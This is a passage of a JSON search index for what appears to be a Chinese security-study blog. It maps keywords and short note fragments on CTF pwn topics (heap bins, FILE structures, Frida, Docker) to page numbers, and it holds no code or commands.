{\"1\":{\"55\":2}}],[\"private\",{\"1\":{\"21\":2}}],[\"printerr\",{\"1\":{\"81\":2,\"90\":1,\"97\":5,\"104\":2,\"106\":1,\"109\":11,\"110\":1,\"127\":1,\"129\":3,\"130\":2,\"163\":1,\"285\":1}}],[\"printemo是根据emo\",{\"1\":{\"78\":1}}],[\"printf\",{\"1\":{\"75\":4,\"182\":5,\"247\":7,\"255\":2,\"258\":2,\"264\":4}}],[\"println\",{\"1\":{\"21\":1}}],[\"printstudent\",{\"1\":{\"21\":1}}],[\"print\",{\"1\":{\"20\":1,\"66\":6,\"118\":1,\"143\":12,\"144\":11,\"154\":6,\"165\":12,\"246\":1,\"248\":2,\"255\":1,\"256\":1,\"258\":2,\"260\":13,\"264\":7,\"265\":1,\"266\":2,\"268\":2,\"269\":1,\"271\":2,\"273\":11,\"276\":10,\"287\":12,\"288\":18,\"290\":2}}],[\"pie\",{\"1\":{\"254\":2}}],[\"pic\",{\"1\":{\"58\":1}}],[\"ping\",{\"1\":{\"46\":5}}],[\"pike\",{\"1\":{\"43\":1}}],[\"pipe\",{\"1\":{\"43\":2}}],[\"port\",{\"1\":{\"258\":2,\"260\":2,\"264\":2,\"265\":2,\"266\":2,\"267\":2,\"268\":2,\"269\":2,\"270\":2,\"271\":2,\"273\":2,\"276\":2,\"288\":2,\"289\":2,\"290\":2}}],[\"ports\",{\"1\":{\"43\":1}}],[\"popq\",{\"1\":{\"234\":3}}],[\"pop操作我们的rsp向下移动一格\",{\"1\":{\"231\":1}}],[\"pop\",{\"1\":{\"231\":3,\"258\":2,\"268\":4,\"288\":6,\"289\":3}}],[\"pos\",{\"1\":{\"202\":1}}],[\"position\",{\"1\":{\"202\":2}}],[\"positive\",{\"1\":{\"109\":1,\"124\":1}}],[\"posix\",{\"1\":{\"202\":1,\"243\":1}}],[\"possibility\",{\"1\":{\"137\":1}}],[\"possibly\",{\"1\":{\"109\":1}}],[\"posts\",{\"0\":{\"292\":1}}],[\"post\",{\"1\":{\"43\":1,\"245\":2}}],[\"point指向的就是内容chunk\",{\"1\":{\"159\":1,\"281\":1}}],[\"pointer\",{\"1\":{\"109\":1,\"175\":5,\"193\":5,\"213\":2}}],[\"point\",{\"1\":{\"77\":4,\"109\":1,\"124\":1,\"159\":1,\"281\":1}}],[\"poll\",{\"1\":{\"64\":1}}],[\"pushq\",{\"1\":{\"234\":3}}],[\"push\",{\"1\":{\"234\":2,\"268\":9}}],[\"puts函数\",{\"1\":{\"268\":1}}],[\"puts\",{\"1\":{\"182\":14,\"254\":2}}],[\"putback+get\",{\"1\":{\"175\":1,\"193\":1}}],[\"put\",{\"1\":{\"100\":1,\"109\":1,\"127\":1,\"175\":3,\"182\":1,\"193\":3}}],[\"pull\",{\"0\":{\"45\":1},\"1\":{\"43\":1,\"45\":1}}],[\"public\",{\"1\":{\"19\":5,\"20\":4,\"21\":6}}],[\"pwnlib\",{\"1\":{\"270\":2}}],[\"pwn1\",{\"0\":{\"254\":1},\"1\":{\"254\":2,\"256\":1}}],[\"pwn进你的心\",{\"1\":{\"222\":1}}],[\"pwn环境搭建+so文件的调试\",{\"1\":{\"222\":2}}],[\"pwn学习\",{\"0\":{\"221\":1}}],[\"pwncli\",{\"1\":{\"154\":1}}],[\"pwn3阅读笔记\",{\"0\":{\"126\":1}}],[\"pwngdb的话直接输入tls也可以查到\",{\"1\":{\"118\":1}}],[\"pwndbg>\",{\"1\":{\"96\":2}}],[\"pwndocker\",{\"1\":{\"44\":1,\"45\":1}}],[\"pwnki\",{\"1\":{\"92\":2}}],[\"pwn\",{\"0\":{\"116\":1,\"257\":1,\"298\":1,\"301\":1},\"1\":{\"41\":1,\"43\":2,\"47\":2,\"80\":1,\"111\":2,\"143\":1,\"144\":1,\"154\":1,\"157\":1,\"167\":3,\"178\":1,\"182\":1,\"230\":1,\"254\":1,\"256\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":2,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"279\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"p\",{\"1\":{\"36\":1,\"43\":1,\"80\":2,\"81\":26,\"90\":3,\"98\":3,\"100\":3,\"107\":3,\"109\":49,\"124\":11,\"127\":2,\"129\":25,\"130\":9,\"138\":8,\"154\":11,\"163\":4,\"175\":1,\"182\":4,\"224\":7,\"226\":3,\"227\":4,\"258\":11,\"260\":11,\"264\":11,\"265\":11,\"266\":11,\"267\":11,\"268\":12,\"269\":11,\"270\":5,\"271\":11,\"273\":12,\"276\":11,\"285\":4,\"288\":12,\"289\":11,\"290\":11}}],[\"passwd\",{\"1\":{\"258\":2}}],[\"partial\",{\"1\":{\"254\":1}}],[\"parent\",{\"1\":{\"138\":1}}],[\"patchelf\",{\"1\":{\"241\":3}}],[\"path程序加载运行期间查找动态链接库的路径\",{\"1\":{\"238\":1}}],[\"path这个变量是程序编译期间查找动态链接库时指定查找共享库的路径\",{\"1\":{\"238\":1}}],[\"path也不会起效果\",{\"1\":{\"238\":1}}],[\"path所以当程序由runpath后我们就算修改ld\",{\"1\":{\"238\":1}}],[\"path\",{\"1\":{\"213\":2,\"238\":1,\"270\":1}}],[\"payload=b\",{\"1\":{\"270\":2}}],[\"payload=str\",{\"1\":{\"264\":1}}],[\"payload的长度+1\",{\"1\":{\"130\":1}}],[\"payload\",{\"0\":{\"253\":1},\"1\":{\"127\":1,\"143\":4,\"144\":4,\"256\":2,\"258\":4,\"264\":6,\"268\":6,\"270\":2,\"271\":2,\"289\":2,\"290\":5}}],[\"pad5\",{\"1\":{\"174\":1,\"193\":1}}],[\"pad\",{\"1\":{\"109\":2,\"138\":2}}],[\"packed\",{\"1\":{\"132\":1}}],[\"packet\",{\"1\":{\"46\":1}}],[\"packets\",{\"1\":{\"46\":1}}],[\"pack\",{\"1\":{\"29\":1}}],[\"package\",{\"1\":{\"20\":1}}],[\"pause意思是在程序启动后不要停止程序的进程\",{\"1\":{\"14\":1}}],[\"pause\",{\"1\":{\"14\":2,\"27\":3,\"270\":1}}],[\"pages\",{\"1\":{\"223\":3}}],[\"page\",{\"1\":{\"0\":2,\"223\":3}}],[\"ps\",{\"1\":{\"11\":1,\"43\":1}}],[\"pc查询手机的进程\",{\"0\":{\"11\":1}}],[\"dd\",{\"1\":{\"255\":1}}],[\"dynsym中哪个结构体\",{\"1\":{\"236\":1}}],[\"dynsym存函数名字在\",{\"1\":{\"236\":1}}],[\"dynsym\",{\"1\":{\"236\":2}}],[\"dynsym这个数组的下标\",{\"1\":{\"236\":1}}],[\"dynstr中的位置\",{\"1\":{\"236\":1}}],[\"dynstr存函数名字\",{\"1\":{\"236\":1}}],[\"dynstr数组中的下标\",{\"1\":{\"236\":1}}],[\"dynstr\",{\"1\":{\"236\":2}}],[\"dynamic\",{\"1\":{\"27\":1}}],[\"dl\",{\"0\":{\"235\":1},\"1\":{\"234\":20,\"235\":2}}],[\"dbg\",{\"1\":{\"224\":2,\"227\":2}}],[\"dc\",{\"1\":{\"224\":2,\"226\":2}}],[\"ds\",{\"1\":{\"218\":1,\"219\":1,\"220\":3}}],[\"dtor\",{\"1\":{\"157\":1,\"279\":1,\"288\":4}}],[\"dword\",{\"1\":{\"77\":2,\"255\":1}}],[\"da\",{\"1\":{\"180\":3}}],[\"daemon\",{\"1\":{\"43\":2}}],[\"data修改值\",{\"1\":{\"202\":1}}],[\"data相对于file结构体来说偏移值为0xa0\",{\"1\":{\"180\":1}}],[\"data偏移从0x0到0x30地址处都会被覆写上fp\",{\"1\":{\"173\":1}}],[\"data位于偏移0xa0\",{\"1\":{\"173\":1}}],[\"data地址所指区域会被覆写上overflow\",{\"1\":{\"173\":1}}],[\"data字段保存的地址附近写入值\",{\"1\":{\"169\":1}}],[\"data\",{\"0\":{\"175\":1},\"1\":{\"36\":1,\"39\":1,\"58\":1,\"127\":2,\"154\":4,\"173\":1,\"174\":2,\"175\":3,\"180\":2,\"181\":2,\"182\":7,\"188\":1,\"192\":1,\"193\":4,\"195\":16,\"211\":4,\"224\":3,\"226\":1,\"227\":2,\"258\":4,\"260\":4,\"264\":4,\"265\":4,\"266\":4,\"267\":4,\"268\":4,\"269\":4,\"271\":4,\"273\":4,\"276\":8,\"288\":14,\"289\":4,\"290\":4}}],[\"dummy2\",{\"1\":{\"186\":1}}],[\"dummy\",{\"1\":{\"180\":3,\"186\":1}}],[\"dump\",{\"1\":{\"30\":6,\"32\":3}}],[\"dumpsys\",{\"1\":{\"29\":1,\"30\":1}}],[\"dup\",{\"0\":{\"124\":1,\"127\":1}}],[\"during\",{\"1\":{\"43\":2}}],[\"doallocate\",{\"1\":{\"180\":6,\"186\":2}}],[\"do\",{\"1\":{\"109\":1,\"124\":1,\"136\":1,\"154\":1,\"176\":1,\"202\":1,\"224\":2,\"226\":1,\"227\":1,\"252\":1}}],[\"don\",{\"1\":{\"109\":4,\"127\":2,\"174\":1,\"202\":1}}],[\"done\",{\"1\":{\"65\":2,\"252\":1}}],[\"double\",{\"1\":{\"81\":1,\"90\":1,\"97\":1,\"104\":2,\"109\":7,\"110\":1,\"124\":2,\"127\":3,\"129\":2,\"130\":1,\"163\":1,\"223\":1,\"259\":1,\"285\":1}}],[\"does\",{\"1\":{\"55\":1,\"106\":1,\"134\":1,\"138\":1}}],[\"doesreactnativeexist\",{\"1\":{\"30\":1}}],[\"documents\",{\"1\":{\"58\":1}}],[\"docker镜像\",{\"1\":{\"46\":1}}],[\"docker内路径\",{\"1\":{\"43\":2}}],[\"dockerbackendapiserver\",{\"1\":{\"43\":1}}],[\"docker\",{\"0\":{\"294\":1},\"1\":{\"43\":13,\"45\":1,\"46\":1,\"47\":2}}],[\"docker配置任意版本编译环境\",{\"1\":{\"41\":1}}],[\"docs\",{\"1\":{\"0\":1,\"27\":1,\"50\":1}}],[\"di位置去\",{\"1\":{\"220\":1}}],[\"digits\",{\"1\":{\"165\":2,\"287\":2,\"288\":1}}],[\"di\",{\"1\":{\"43\":1,\"220\":3}}],[\"displaychunk\",{\"1\":{\"269\":2}}],[\"displaychunks\",{\"1\":{\"269\":1}}],[\"display\",{\"1\":{\"27\":1}}],[\"displays\",{\"1\":{\"27\":1}}],[\"dick\",{\"1\":{\"20\":2}}],[\"dec\",{\"1\":{\"268\":2}}],[\"decrement\",{\"1\":{\"137\":1}}],[\"deepunk\",{\"1\":{\"221\":1}}],[\"deal\",{\"1\":{\"138\":1}}],[\"deallocated\",{\"1\":{\"124\":1}}],[\"depends\",{\"1\":{\"137\":1}}],[\"detach\",{\"1\":{\"134\":1,\"138\":1}}],[\"detected\",{\"1\":{\"127\":1}}],[\"dereference\",{\"1\":{\"109\":1,\"124\":1}}],[\"desired\",{\"1\":{\"288\":3}}],[\"design\",{\"1\":{\"109\":1}}],[\"dest\",{\"1\":{\"246\":37}}],[\"dest3\",{\"1\":{\"244\":1,\"247\":3}}],[\"dest2\",{\"1\":{\"244\":1,\"247\":3}}],[\"dest1\",{\"1\":{\"244\":1,\"247\":3}}],[\"dest0\",{\"1\":{\"244\":1,\"245\":1,\"247\":3}}],[\"destop导致报错\",{\"1\":{\"43\":1}}],[\"descriptor\",{\"1\":{\"202\":1}}],[\"described\",{\"1\":{\"132\":1}}],[\"delete\",{\"1\":{\"141\":1,\"143\":2,\"144\":2,\"158\":1,\"161\":1,\"163\":3,\"165\":4,\"260\":5,\"269\":1,\"273\":11,\"276\":5,\"280\":1,\"283\":1,\"285\":3,\"287\":4,\"288\":15}}],[\"delete函数\",{\"1\":{\"141\":1,\"156\":1,\"278\":1}}],[\"delete部分无懈可击\",{\"1\":{\"86\":1}}],[\"del\",{\"1\":{\"64\":1}}],[\"define\",{\"1\":{\"80\":1,\"132\":1,\"136\":1,\"179\":3,\"180\":4,\"189\":1}}],[\"def\",{\"1\":{\"64\":5,\"66\":2,\"143\":7,\"144\":7,\"154\":4,\"260\":4,\"265\":1,\"269\":5,\"273\":6,\"276\":5,\"288\":9}}],[\"default\",{\"1\":{\"27\":1,\"180\":9,\"247\":1}}],[\"development\",{\"0\":{\"291\":1}}],[\"develop分支一半用于功能开发或者集成测试\",{\"1\":{\"53\":1}}],[\"developer\",{\"1\":{\"48\":1}}],[\"debug\",{\"1\":{\"47\":1,\"143\":1,\"144\":1,\"154\":2,\"224\":4,\"227\":4,\"256\":1,\"258\":2,\"260\":3,\"264\":2,\"265\":2,\"266\":2,\"267\":2,\"268\":3,\"269\":3,\"270\":1,\"271\":3,\"273\":4,\"276\":2,\"288\":6,\"289\":2,\"290\":2}}],[\"debuggable\",{\"1\":{\"37\":1}}],[\"demo\",{\"1\":{\"0\":1}}],[\"d\",{\"1\":{\"21\":1,\"43\":2,\"247\":4,\"264\":1}}],[\"fmt\",{\"0\":{\"261\":1}}],[\"f变化\",{\"1\":{\"196\":1}}],[\"f的值\",{\"1\":{\"193\":1}}],[\"fwrite\",{\"1\":{\"189\":1}}],[\"fwd改为链表头\",{\"1\":{\"104\":1}}],[\"fwd\",{\"1\":{\"102\":2,\"103\":2,\"104\":22,\"106\":4,\"109\":7,\"110\":9}}],[\"fp+0xd8\",{\"1\":{\"189\":1}}],[\"fp=fopen\",{\"1\":{\"189\":1}}],[\"fpmkdfryo6veth5\",{\"1\":{\"188\":1}}],[\"fp\",{\"1\":{\"179\":2,\"180\":2,\"188\":2,\"189\":3,\"192\":1,\"193\":1,\"195\":18,\"202\":10,\"205\":1,\"211\":14}}],[\"fcloseall\",{\"1\":{\"171\":1}}],[\"float\",{\"1\":{\"254\":1,\"255\":2}}],[\"flat\",{\"1\":{\"220\":1}}],[\"flag位置\",{\"1\":{\"290\":1}}],[\"flag字符串\",{\"1\":{\"290\":1}}],[\"flag\",{\"0\":{\"268\":1,\"269\":1},\"1\":{\"96\":1,\"189\":1,\"247\":10,\"254\":1,\"268\":1,\"288\":3,\"290\":2}}],[\"flags变化\",{\"1\":{\"196\":1}}],[\"flags2\",{\"1\":{\"193\":1}}],[\"flags\",{\"1\":{\"21\":1,\"132\":2,\"182\":2,\"193\":3,\"195\":2,\"196\":1,\"202\":4}}],[\"flush\",{\"0\":{\"208\":1},\"1\":{\"169\":1,\"206\":1}}],[\"feifei\",{\"1\":{\"245\":1}}],[\"few\",{\"1\":{\"127\":1}}],[\"feature分支用于创建新功能时的测试分支\",{\"1\":{\"53\":1}}],[\"feat\",{\"1\":{\"50\":2}}],[\"fsop细读\",{\"0\":{\"206\":1}}],[\"fseek\",{\"1\":{\"202\":1}}],[\"fs\",{\"0\":{\"118\":1}}],[\"fb\",{\"1\":{\"109\":7,\"124\":5,\"163\":1,\"285\":1}}],[\"fopen\",{\"1\":{\"188\":3,\"204\":2}}],[\"fopen函数\",{\"0\":{\"188\":1},\"1\":{\"205\":1}}],[\"fopen函数会自动通过malloc\",{\"1\":{\"185\":1}}],[\"following\",{\"1\":{\"137\":1,\"175\":1,\"193\":1,\"202\":1}}],[\"found\",{\"1\":{\"109\":1,\"254\":1}}],[\"foot就是下一个chunk的prev\",{\"1\":{\"106\":1}}],[\"foot\",{\"1\":{\"98\":1,\"106\":1,\"109\":1}}],[\"format\",{\"1\":{\"255\":1,\"273\":2}}],[\"formerly\",{\"1\":{\"132\":1}}],[\"forth\",{\"1\":{\"188\":1}}],[\"fork\",{\"1\":{\"138\":1}}],[\"forward\",{\"1\":{\"10\":1,\"109\":1}}],[\"for\",{\"1\":{\"0\":1,\"19\":1,\"22\":2,\"27\":1,\"55\":1,\"64\":1,\"66\":2,\"71\":2,\"106\":1,\"109\":4,\"124\":1,\"127\":1,\"132\":1,\"137\":2,\"138\":1,\"143\":3,\"144\":2,\"158\":2,\"161\":3,\"163\":4,\"165\":8,\"176\":1,\"244\":2,\"246\":1,\"247\":2,\"248\":1,\"252\":1,\"260\":6,\"265\":1,\"273\":8,\"276\":8,\"280\":2,\"283\":3,\"285\":4,\"287\":8,\"288\":23}}],[\"fd需要是heap基地址^目标地址\",{\"1\":{\"164\":1,\"286\":1}}],[\"fd加密机制\",{\"0\":{\"164\":1,\"286\":1}}],[\"fd位置赋值\",{\"1\":{\"152\":1}}],[\"fd和bk都被清空了\",{\"1\":{\"143\":1}}],[\"fd和bk\",{\"1\":{\"130\":1}}],[\"fd指向的是\",{\"1\":{\"123\":1}}],[\"fd指向下一个free\",{\"1\":{\"122\":1}}],[\"fd或者bk\",{\"1\":{\"81\":1}}],[\"fd\",{\"1\":{\"80\":2,\"81\":5,\"96\":1,\"109\":1,\"114\":2,\"129\":13,\"130\":4,\"143\":3,\"144\":3,\"148\":1,\"150\":1,\"162\":1,\"273\":1,\"284\":1,\"288\":2}}],[\"fflush\",{\"1\":{\"75\":1,\"182\":2,\"202\":1}}],[\"fake\",{\"1\":{\"143\":3,\"144\":3,\"182\":1,\"231\":1}}],[\"fakechunk\",{\"1\":{\"143\":2,\"144\":2,\"153\":1,\"162\":6,\"273\":2,\"276\":12,\"284\":6}}],[\"fakeunlink\",{\"1\":{\"130\":1}}],[\"fact\",{\"1\":{\"137\":1}}],[\"false\",{\"1\":{\"109\":1,\"124\":1}}],[\"fail\",{\"1\":{\"109\":3,\"137\":1}}],[\"failed\",{\"1\":{\"27\":1,\"43\":1}}],[\"fastfastfast\",{\"0\":{\"259\":1}}],[\"fastcall\",{\"1\":{\"244\":1,\"245\":1}}],[\"fastchunks\",{\"1\":{\"109\":2,\"124\":1,\"132\":1}}],[\"fast或者fast\",{\"1\":{\"132\":1}}],[\"fasttop\",{\"1\":{\"109\":2,\"124\":1,\"163\":1,\"285\":1}}],[\"fastbin情况\",{\"1\":{\"276\":1}}],[\"fastbin会检查你free的是否为第一个chunk\",{\"1\":{\"163\":1,\"285\":1}}],[\"fastbin合并机制\",{\"0\":{\"161\":1,\"283\":1}}],[\"fastbin最小结构为0x20\",{\"1\":{\"114\":1}}],[\"fastbinsy\",{\"1\":{\"132\":1}}],[\"fastbins\",{\"1\":{\"109\":5,\"132\":1}}],[\"fastbin\",{\"0\":{\"122\":1,\"124\":1},\"1\":{\"109\":12,\"120\":1,\"124\":9,\"132\":1,\"276\":2}}],[\"fast的chunk或者fast\",{\"1\":{\"69\":1}}],[\"fast\",{\"1\":{\"69\":2,\"109\":3,\"114\":1,\"115\":1,\"120\":1,\"124\":1,\"132\":4,\"213\":1}}],[\"future值相关\",{\"1\":{\"65\":1}}],[\"future\",{\"0\":{\"65\":1},\"1\":{\"63\":1}}],[\"fun=new\",{\"1\":{\"23\":1}}],[\"func处\",{\"1\":{\"165\":1,\"287\":1}}],[\"funcs链表的方式\",{\"1\":{\"157\":1,\"279\":1}}],[\"funcs链表\",{\"0\":{\"165\":1,\"287\":1},\"1\":{\"157\":2,\"163\":1,\"279\":2,\"285\":1}}],[\"func\",{\"1\":{\"23\":1,\"179\":3,\"180\":3,\"182\":1,\"254\":1}}],[\"func=parseint\",{\"1\":{\"23\":1}}],[\"function地址处\",{\"1\":{\"165\":1,\"287\":1}}],[\"function\",{\"1\":{\"16\":1,\"17\":2,\"18\":1,\"19\":2,\"20\":1,\"21\":3,\"22\":3,\"23\":3,\"27\":4,\"165\":5,\"195\":1,\"234\":2,\"236\":1,\"287\":5}}],[\"fun\",{\"1\":{\"23\":2}}],[\"f9a80a55f492\",{\"1\":{\"43\":1}}],[\"finish\",{\"1\":{\"180\":6,\"186\":2}}],[\"find\",{\"1\":{\"43\":2}}],[\"findbaseaddress\",{\"1\":{\"23\":1}}],[\"fit\",{\"1\":{\"138\":1,\"176\":1}}],[\"fields\",{\"1\":{\"175\":1,\"193\":1}}],[\"field\",{\"1\":{\"132\":2,\"180\":1,\"186\":21}}],[\"first\",{\"1\":{\"106\":2,\"175\":1,\"188\":1,\"193\":1,\"202\":1}}],[\"fixup\",{\"1\":{\"234\":11}}],[\"fixup然后这个函数将真实的地址返回给rax寄存器\",{\"1\":{\"234\":1}}],[\"fixme\",{\"1\":{\"134\":1,\"138\":1}}],[\"fixes\",{\"1\":{\"55\":2}}],[\"fix\",{\"1\":{\"51\":1}}],[\"fix修复bug\",{\"1\":{\"50\":1}}],[\"file利用\",{\"0\":{\"214\":1}}],[\"file中经典利用\",{\"1\":{\"206\":1}}],[\"filebuf\",{\"1\":{\"202\":1}}],[\"fileno\",{\"1\":{\"193\":1,\"202\":2,\"205\":1}}],[\"filename\",{\"1\":{\"188\":1,\"204\":1}}],[\"file相关利用\",{\"1\":{\"183\":1}}],[\"file相关学习有点蛋疼\",{\"1\":{\"183\":1}}],[\"file结构体全部内容\",{\"1\":{\"174\":1}}],[\"files\",{\"1\":{\"58\":1}}],[\"file\",{\"0\":{\"174\":1,\"183\":1,\"185\":1,\"299\":1},\"1\":{\"43\":2,\"58\":1,\"174\":4,\"179\":1,\"180\":25,\"182\":1,\"184\":3,\"185\":3,\"187\":1,\"188\":17,\"189\":1,\"192\":4,\"193\":1,\"195\":2,\"196\":1,\"198\":1,\"199\":1,\"201\":1,\"202\":7,\"204\":3,\"205\":3,\"224\":4,\"226\":4,\"240\":1,\"241\":3,\"249\":8,\"258\":4,\"260\":4,\"264\":4,\"265\":4,\"266\":4,\"267\":4,\"268\":5,\"269\":4,\"270\":3,\"271\":4,\"273\":4,\"276\":4,\"288\":4,\"289\":4,\"290\":4}}],[\"filter中category\",{\"1\":{\"40\":1}}],[\"filter中action\",{\"1\":{\"40\":1}}],[\"filter标签\",{\"0\":{\"39\":1}}],[\"filter>标签来实现设置\",{\"1\":{\"38\":1}}],[\"filter的action带来的变化\",{\"1\":{\"36\":1}}],[\"filter的四个属性action\",{\"1\":{\"36\":1,\"39\":1}}],[\"filter\",{\"1\":{\"36\":1,\"39\":1,\"40\":1}}],[\"f\",{\"1\":{\"14\":2,\"27\":2,\"143\":3,\"144\":3,\"154\":1,\"176\":1,\"188\":12,\"192\":1,\"195\":2,\"196\":2,\"198\":1,\"201\":1,\"204\":2,\"249\":2,\"255\":4,\"260\":2,\"276\":2,\"288\":2}}],[\"fruit\",{\"1\":{\"252\":1}}],[\"fread\",{\"1\":{\"185\":1}}],[\"free来触发double\",{\"1\":{\"275\":1}}],[\"free来malloc下来tls附近的内存区域\",{\"1\":{\"163\":1,\"285\":1}}],[\"free了\",{\"1\":{\"269\":1}}],[\"freeres\",{\"1\":{\"174\":2,\"193\":2,\"195\":1}}],[\"free劫持的chunk大小需要够大\",{\"1\":{\"163\":1,\"285\":1}}],[\"free所以我们让记录头信息的chunk进入fastbin中\",{\"1\":{\"157\":1,\"279\":1}}],[\"free掉chunk\",{\"1\":{\"153\":1}}],[\"free让整个链表陷入循环\",{\"1\":{\"124\":1}}],[\"free的时候没有做任何检测\",{\"1\":{\"259\":1}}],[\"free的时候就不能选择这个size大小的链了\",{\"1\":{\"165\":1,\"287\":1}}],[\"free的机制\",{\"1\":{\"163\":1,\"285\":1}}],[\"free的fastbinchunk地址\",{\"1\":{\"162\":1,\"284\":1}}],[\"free的chunk地址\",{\"1\":{\"165\":1,\"287\":1}}],[\"free的chunk\",{\"1\":{\"151\":2}}],[\"free的\",{\"1\":{\"123\":1}}],[\"free函数\",{\"1\":{\"120\":1}}],[\"freeing\",{\"1\":{\"109\":1}}],[\"free\",{\"0\":{\"109\":1,\"120\":1,\"224\":1,\"227\":1},\"1\":{\"96\":1,\"109\":19,\"114\":1,\"124\":5,\"127\":5,\"132\":7,\"134\":2,\"137\":1,\"138\":10,\"150\":6,\"151\":2,\"152\":3,\"153\":2,\"154\":12,\"157\":2,\"158\":1,\"162\":1,\"163\":2,\"165\":6,\"188\":1,\"223\":9,\"224\":6,\"226\":3,\"227\":4,\"259\":2,\"260\":3,\"275\":3,\"276\":2,\"279\":2,\"280\":1,\"284\":1,\"285\":2,\"287\":6}}],[\"free后任意地址malloc\",{\"1\":{\"259\":1}}],[\"free后\",{\"1\":{\"70\":1}}],[\"free后打印出main\",{\"1\":{\"69\":1}}],[\"from\",{\"1\":{\"109\":1,\"132\":2,\"137\":2,\"138\":3,\"143\":1,\"144\":1,\"154\":2,\"256\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"front\",{\"1\":{\"0\":1}}],[\"frida的反调试\",{\"0\":{\"24\":1}}],[\"frida的基本使用\",{\"0\":{\"9\":1}}],[\"frida\",{\"1\":{\"9\":1,\"11\":1,\"14\":2,\"27\":7}}],[\"i+1\",{\"1\":{\"276\":1,\"288\":1}}],[\"i++\",{\"1\":{\"19\":1,\"22\":2,\"27\":1,\"247\":1}}],[\"i386\",{\"1\":{\"268\":4}}],[\"ignore\",{\"1\":{\"249\":1}}],[\"icu\",{\"1\":{\"221\":1}}],[\"io函数函数的原理\",{\"0\":{\"187\":1}}],[\"io函数源码阅读\",{\"1\":{\"183\":1}}],[\"io\",{\"0\":{\"172\":1,\"174\":1,\"175\":1,\"176\":1,\"179\":1,\"180\":1,\"194\":1,\"208\":1,\"213\":1,\"214\":1,\"216\":1,\"299\":1},\"1\":{\"169\":4,\"170\":1,\"171\":1,\"172\":4,\"173\":2,\"174\":6,\"175\":18,\"176\":2,\"179\":5,\"180\":90,\"182\":13,\"183\":4,\"184\":3,\"185\":1,\"186\":21,\"187\":1,\"188\":25,\"192\":5,\"193\":40,\"195\":19,\"196\":1,\"198\":2,\"199\":1,\"201\":1,\"202\":16,\"204\":1,\"205\":3,\"206\":2,\"207\":1,\"211\":12,\"212\":2,\"213\":10,\"215\":2,\"216\":2,\"222\":2}}],[\"ia\",{\"1\":{\"154\":1,\"165\":1,\"258\":2,\"260\":2,\"264\":2,\"265\":2,\"266\":2,\"267\":2,\"268\":3,\"269\":2,\"271\":2,\"273\":2,\"276\":2,\"287\":1,\"288\":2,\"289\":2,\"290\":2}}],[\"irrelevant\",{\"1\":{\"137\":1}}],[\"i这个是emo\",{\"1\":{\"77\":1}}],[\"ip\",{\"1\":{\"46\":5,\"268\":3}}],[\"ipc\",{\"1\":{\"43\":1}}],[\"it\",{\"0\":{\"277\":1,\"288\":1},\"1\":{\"43\":1,\"55\":1,\"109\":2,\"124\":1,\"127\":5,\"138\":1}}],[\"its\",{\"0\":{\"274\":1},\"1\":{\"27\":1,\"109\":3,\"124\":1,\"254\":1}}],[\"idc\",{\"1\":{\"246\":2,\"255\":2}}],[\"idx\",{\"1\":{\"90\":2,\"100\":2,\"109\":7,\"120\":1,\"124\":7,\"127\":6,\"260\":3,\"273\":4,\"276\":1,\"288\":2}}],[\"id来查看\",{\"1\":{\"59\":1}}],[\"id\",{\"1\":{\"43\":6,\"59\":2,\"265\":3,\"276\":2,\"288\":2}}],[\"id=socket\",{\"1\":{\"27\":1}}],[\"imbue\",{\"1\":{\"180\":6,\"186\":2}}],[\"immediately\",{\"1\":{\"137\":1}}],[\"img\",{\"1\":{\"30\":1,\"58\":1,\"86\":1,\"87\":1,\"91\":1,\"223\":1}}],[\"images\",{\"1\":{\"43\":2}}],[\"image\",{\"0\":{\"45\":1},\"1\":{\"30\":1,\"32\":1,\"33\":1,\"34\":1,\"43\":2,\"61\":1,\"66\":2,\"86\":1,\"88\":2,\"91\":1,\"136\":1,\"147\":2,\"150\":2,\"151\":1,\"152\":2,\"153\":3,\"156\":4,\"158\":3,\"160\":1,\"161\":2,\"162\":1,\"163\":2,\"170\":1,\"171\":2,\"172\":3,\"174\":1,\"175\":1,\"177\":1,\"181\":1,\"190\":1,\"193\":2,\"196\":1,\"199\":3,\"202\":5,\"205\":4,\"209\":1,\"210\":1,\"216\":3,\"225\":2,\"258\":1,\"259\":4,\"262\":1,\"265\":1,\"267\":2,\"278\":4,\"280\":3,\"282\":1,\"283\":2,\"284\":1,\"285\":2}}],[\"important\",{\"1\":{\"71\":1}}],[\"import\",{\"1\":{\"21\":1,\"143\":1,\"144\":1,\"154\":2,\"246\":1,\"248\":1,\"255\":1,\"256\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":2,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":2,\"271\":1,\"273\":2,\"276\":1,\"288\":1,\"289\":2,\"290\":2}}],[\"implementation=function\",{\"1\":{\"17\":1,\"19\":2,\"20\":1}}],[\"implementations\",{\"1\":{\"17\":1,\"18\":1}}],[\"i<methods\",{\"1\":{\"22\":2}}],[\"i<overlength\",{\"1\":{\"19\":1}}],[\"ifs=\",{\"1\":{\"252\":1}}],[\"ifs变量\",{\"0\":{\"250\":1}}],[\"ifs\",{\"0\":{\"251\":1},\"1\":{\"248\":1,\"251\":3}}],[\"ifdef\",{\"1\":{\"188\":2,\"192\":1}}],[\"ifndef\",{\"1\":{\"109\":1}}],[\"if\",{\"1\":{\"22\":2,\"27\":1,\"75\":2,\"81\":2,\"90\":4,\"97\":5,\"98\":2,\"100\":1,\"103\":1,\"104\":5,\"105\":1,\"106\":6,\"109\":42,\"110\":1,\"124\":7,\"127\":6,\"129\":6,\"130\":2,\"132\":2,\"136\":1,\"137\":10,\"138\":5,\"154\":1,\"163\":1,\"188\":2,\"195\":1,\"202\":1,\"204\":1,\"213\":2,\"223\":1,\"224\":4,\"226\":2,\"227\":2,\"244\":1,\"245\":1,\"246\":1,\"248\":1,\"249\":1,\"254\":1,\"285\":1,\"288\":1}}],[\"i\",{\"1\":{\"19\":1,\"22\":3,\"27\":3,\"43\":1,\"66\":4,\"77\":7,\"109\":2,\"124\":1,\"143\":12,\"144\":8,\"158\":4,\"161\":5,\"163\":8,\"165\":16,\"244\":4,\"246\":3,\"247\":11,\"248\":2,\"249\":1,\"260\":12,\"265\":2,\"273\":16,\"276\":16,\"280\":4,\"283\":5,\"285\":8,\"287\":16,\"288\":43}}],[\"i=0\",{\"1\":{\"19\":1,\"22\